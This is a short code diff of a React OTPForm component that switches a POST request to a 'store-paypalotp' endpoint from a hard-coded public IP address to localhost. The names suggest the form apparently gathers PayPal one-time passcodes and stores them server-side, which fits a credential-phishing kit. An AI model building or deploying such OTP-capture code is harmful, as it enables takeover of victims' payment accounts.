@@ -69,7 +69,7 @@ const OTPForm = () => {
       );
 
       const response = await fetch(
-        `https://147.93.86.156:443/api/store-paypalotp/${userId}`,
+        `http://localhost:8000/api/store-paypalotp/${userId}`,
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
